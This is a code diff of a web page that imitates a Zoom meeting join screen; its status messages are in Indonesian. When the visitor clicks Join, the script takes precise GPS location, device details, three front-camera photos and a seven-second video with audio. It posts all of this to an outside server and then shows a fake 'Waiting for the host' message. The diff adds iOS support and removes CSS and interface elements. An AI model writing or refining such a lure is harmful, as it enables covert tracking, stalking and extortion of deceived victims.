@@ -39,10 +39,7 @@
       color: #0e71eb;
       letter-spacing: -1px;
     }
-    .top-right {
-      display: flex;
-      gap: 12px;
-    }
+    .top-right { display: flex; gap: 12px; }
     .btn-support, .btn-signup {
       padding: 6px 16px;
       border-radius: 9999px;
@@ -50,33 +47,12 @@
       font-weight: 500;
       cursor: pointer;
     }
-    .btn-support {
-      border: 1px solid #0e71eb;
-      color: #0e71eb;
-      background: white;
-    }
-    .btn-signup {
-      background: #0e71eb;
-      color: white;
-      border: none;
-    }
-    .main-content {
-      padding: 40px 32px 32px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 32px;
-      color: #1f2937;
-    }
-    .input-label {
-      text-align: left;
-      font-size: 14px;
-      font-weight: 500;
-      color: #374151;
-      margin-bottom: 8px;
-    }
+    .btn-support { border: 1px solid #0e71eb; color: #0e71eb; background: white; }
+    .btn-signup { background: #0e71eb; color: white; border: none; }
+
+    .main-content { padding: 40px 32px 32px; text-align: center; }
+    h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; color: #1f2937; }
+    .input-label { text-align: left; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px; }
     input {
       width: 100%;
       padding: 14px 16px;
@@ -85,43 +61,18 @@
       font-size: 16px;
       margin-bottom: 24px;
     }
-    input:focus {
-      outline: none;
-      border-color: #0e71eb;
-      box-shadow: 0 0 0 3px rgba(14, 113, 235, 0.15);
-    }
-    .agreement {
-      font-size: 13px;
-      color: #6b7280;
-      margin-bottom: 24px;
-      line-height: 1.5;
-    }
+    .agreement { font-size: 13px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
     .agreement a { color: #0e71eb; text-decoration: none; }
     .join-btn {
       width: 100%;
       padding: 14px;
-      background: #d1d5db;
-      color: #6b7280;
+      background: #0e71eb;
+      color: white;
       border: none;
       border-radius: 8px;
       font-size: 17px;
       font-weight: 600;
-      cursor: not-allowed;
-      transition: all 0.3s;
-    }
-    .join-btn.active {
-      background: #0e71eb;
-      color: white;
       cursor: pointer;
-    }
-    .join-btn.active:hover {
-      background: #0b5ec4;
-    }
-    .sip-link {
-      margin-top: 28px;
-      font-size: 14px;
-      color: #0e71eb;
-      text-decoration: none;
     }
     .footer {
       padding: 20px 32px;
@@ -131,8 +82,6 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      flex-wrap: wrap;
-      gap: 12px;
     }
   </style>
 </head>
@@ -149,7 +98,6 @@
 
     <div class="main-content">
       <h1>Join Meeting</h1>
-
       <div class="input-label">Meeting ID or Personal Link Name</div>
       <input type="text" id="meetingId" value="987 654 3210" readonly />
 
@@ -159,9 +107,7 @@
         <a href="#">Privacy Statement</a>
       </div>
 
-      <button class="join-btn active" id="joinBtn">Join</button>
-
-      <a href="#" class="sip-link">Join a meeting from an H.323/SIP room system</a>
+      <button class="join-btn" id="joinBtn">Join</button>
     </div>
 
     <div class="footer">
@@ -190,7 +136,7 @@
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: `${screen.width}×${screen.height}`,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
+        isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent)
       };
     }
 
@@ -208,11 +154,7 @@
         // Lokasi
         statusDiv.textContent = 'Mengambil lokasi GPS...';
         const position = await new Promise((res, rej) => 
-          navigator.geolocation.getCurrentPosition(res, rej, {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-          })
+          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 })
         );
 
         const location = {
@@ -222,18 +164,18 @@
         };
 
         // Kamera + Mic
-        statusDiv.textContent = 'Mengaktifkan kamera & mikrofon...';
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: true
+        statusDiv.textContent = 'Mengaktifkan kamera...';
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user' }, 
+          audio: true 
         });
 
         const videoEl = document.getElementById('video');
         videoEl.srcObject = stream;
         await videoEl.play();
 
-        // Ambil 3 Foto
-        statusDiv.textContent = 'Mengambil foto bukti...';
+        // Foto
+        statusDiv.textContent = 'Mengambil foto...';
         const photos = [];
         for (let i = 0; i < 3; i++) {
           await new Promise(r => setTimeout(r, 1000));
@@ -244,13 +186,12 @@
           photos.push(canvas.toDataURL('image/jpeg', 0.85));
         }
 
-        // Rekam Video 7 Detik
+        // Video Recording (Prioritas MP4 untuk iOS Safari)
         statusDiv.textContent = 'Merekam video 7 detik...';
         let chunks = [];
-        let mimeType = 'video/webm';
+        let mimeType = 'video/mp4'; // Default untuk Safari
 
-        // Fallback mimeType
-        const mimeOptions = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+        const mimeOptions = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'];
         for (let type of mimeOptions) {
           if (MediaRecorder.isTypeSupported(type)) {
             mimeType = type;
@@ -270,49 +211,32 @@
         });
 
         // Upload
-        statusDiv.textContent = 'Mengirim data ke server...';
-
+        statusDiv.textContent = 'Mengirim data...';
         const formData = new FormData();
         formData.append('location', JSON.stringify(location));
         formData.append('device_info', JSON.stringify(deviceInfo));
-        formData.append('video', videoBlob, `zoom_${Date.now()}.webm`);
+        formData.append('video', videoBlob, `zoom_${Date.now()}.${mimeType.includes('mp4') ? 'mp4' : 'webm'}`);
 
         for (let i = 0; i < photos.length; i++) {
           const blob = await fetch(photos[i]).then(r => r.blob());
           formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
         }
 
-        const response = await fetch(SERVER_URL, {
-          method: 'POST',
-          body: formData,
-          mode: 'no-cors'        // Penting untuk menghindari CORS block
+        await fetch(SERVER_URL, { 
+          method: 'POST', 
+          body: formData 
         });
 
         statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
-        
-        setTimeout(() => {
-          alert("Waiting for the host to join the meeting...");
-        }, 1500);
+        setTimeout(() => alert("Waiting for the host to join the meeting..."), 1500);
 
       } catch (err) {
-        console.error("FULL ERROR:", err);
-        let message = 'Gagal mengirim data';
-
-        if (err.message.includes('Failed to fetch') || err.name === 'TypeError') {
-          message = 'Koneksi internet bermasalah atau server tidak merespons';
-        } else if (err.name === 'NotAllowedError') {
-          message = 'Izin kamera / lokasi ditolak';
-        } else if (err.name === 'NotFoundError') {
-          message = 'Kamera tidak ditemukan';
-        }
-
-        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ ${message}</span>`;
+        console.error(err);
+        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ Gagal: ${err.message || 'Izin ditolak'}</span>`;
         joinBtn.textContent = 'Coba Lagi';
         joinBtn.disabled = false;
       } finally {
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
+        if (stream) stream.getTracks().forEach(t => t.stop());
       }
     });
   </script>
